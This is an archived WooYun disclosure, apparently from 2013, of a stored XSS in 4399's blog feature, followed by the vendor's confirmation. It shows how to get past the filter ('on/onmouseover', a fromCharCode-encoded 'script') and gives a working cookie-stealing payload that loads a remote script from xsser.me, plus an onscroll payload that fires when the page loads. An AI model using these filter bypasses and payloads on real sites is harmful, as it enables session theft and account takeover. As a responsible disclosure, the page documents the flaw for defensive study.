@@ -1,0 +1,305 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		4399储存型xss，过滤器绕过  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		4399储存型xss，过滤器绕过  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/px1624">px1624</a> 
+</li><li>提交时间：		2013-01-25 12:17</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-25：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-01-25：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-02-04：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-02-14：	细节向普通白帽子公开<br/>
+									2013-02-24：	细节向实习白帽子公开<br/>
+									2013-03-11：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">4399某功能处可以xss，有过滤器过滤，但是可以通过一些手段进行绕过。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1 测试地址<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://my.4399.com/space-693256254-do-blog-id-1140804.html</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+请在确认后漏洞后删掉此地址内容。<br />
+<br />
+<br />
+<br />
+2 4399日志处可以构成xss，此处的过滤器<br />
+<br />
+<br />
+<br />
+传了个图，插了写代码进去，发现会将on expression \ 等过滤成.<br />
+<br />
+<br />
+<br />
+3 经过测试发现，这里应该是对&lt;img&gt;标签的每个属性进行正则，只要发现就进行过滤，但是一个字符串只是过滤最前面的一个特殊字符。<br />
+<br />
+<br />
+<br />
+就是说onload onload===》.load .load   ononload===》.onload<br />
+<br />
+<br />
+<br />
+4 所以直接构造onload为on/onload即可绕过<br />
+<br />
+<br />
+<br />
+5 不过在测试时候发现，虽然可以插进去，F12查看也正常，但是没有执行。&lt;img&gt;的onload onerror之类的貌似都会重新判断一次。<br />
+<br />
+<br />
+<br />
+比如<br />
+<br />
+<br />
+<br />
+</p><pre><code>//伪代码<br />
+if(图片尺寸&gt;50){<br />
+	img.onload=&quot;xxx&quot;<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+所以就又试着插了些别的代码，比如input、iframe等，<br />
+<br />
+<br />
+<br />
+6 测试之后发现这里貌似只能插入&lt;div&gt; &lt;img&gt; &lt;a&gt; &lt;font&gt; &lt;p&gt;等几个标签，看来是做了白名单了<br />
+<br />
+<br />
+<br />
+所以就用onmouseover<br />
+<br />
+<br />
+<br />
+7 插一个大点的&lt;img&gt; &lt;div&gt; 效果也蛮不错诶，基本上进去就会触发了。（图中的红色边框是div的区域，为了让大家看的更加之观点）<br />
+<br />
+<br />
+<br />
+图1<br />
+<br />
+</p><p class="detail"><a href="../images/25111922ab314f35f8e3101b2045deb59f2a0017.jpg" target="_blank"><img src="../images/25111922ab314f35f8e3101b2045deb59f2a0017.jpg" alt="1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+8 插入的代码，以及F12中看到成功插入<br />
+<br />
+<br />
+<br />
+图2 图3<br />
+<br />
+</p><p class="detail"><a href="../images/2511195228058c8055a4bea799d053856644d421.jpg" target="_blank"><img src="../images/2511195228058c8055a4bea799d053856644d421.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/251120048d41476e02a64ce77a0d164a7b1f94bd.jpg" target="_blank"><img src="../images/251120048d41476e02a64ce77a0d164a7b1f94bd.jpg" alt="3.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+9 插入了下盗取cookie的代码，并成功盗取cookie登录<br />
+<br />
+<br />
+<br />
+将onmouseover写为on/onmouseover，会过滤成为. onmouseover<br />
+<br />
+插入成功后的盗取cookie的代码,用F12那里复制出来如下<br />
+<br />
+（这里要注意对script进行下转换，不然script会被过滤成.）<br />
+<br />
+</p><pre><code>&lt;div style=&quot;border:5px solid red;&quot; .=&quot;&quot; onmouseover=&quot;s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=&#039;http://xsser.me/4310VB?&#039;+Math.random();document.body.appendChild(s)&quot;&gt;&lt;img src=&quot;http://p.img4399.com/82248039/3&quot; .=&quot;&quot; onmouseover=&quot;alert(2)&quot;&gt;&lt;/div&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+图4<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/25112013c4e63d2635f30d82d22f02fba83f558f.jpg" target="_blank"><img src="../images/25112013c4e63d2635f30d82d22f02fba83f558f.jpg" alt="4.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+<br />
+<br />
+10 这里&lt;div&gt;也可以插入以下代码直接访问就触发xss<br />
+<br />
+<br />
+<br />
+&lt;div id=&quot;xx&quot; onscroll=&quot;alert(1);&quot; style=&quot;height:30px;overflow-y:auto;width:100px;&quot;&gt;a b c a b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b ca b c&lt;a name=&quot;t&quot;&gt;d&lt;/a&gt;&lt;/div&gt;<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+div 当滚动条滚动的时候触发<br />
+<br />
+<br />
+<br />
+div里面的内容是为了让div出现滚动条，name=&quot;t&quot;那个是为了让可以直接定位到那里使滚动条滚动<br />
+<br />
+<br />
+<br />
+利用地址后面要http://xxx.html#t<br />
+<br />
+<br />
+<br />
+要加上#t 才会直接到&lt;a&gt;标签name处触发onscroll<br />
+<br />
+<br />
+<br />
+11 至于给管理员通过意见反馈、私信等途径，发链接去xss管理员cookie和后台地址这些事情我就不干了。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">看上面描述。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤、、<br />
+<br />
+<br />
+<br />
+会不会忽略、、<br />
+<br />
+<br />
+<br />
+有么有礼物、、 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/px1624" title="px1624">px1624</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-017858" title="4399储存型xss，过滤器绕过">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：5 </p>
+													<p class="detail">确认时间：2013-01-25 16:36</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢你提供的信息，已提交给相关部门处理。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="17858";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
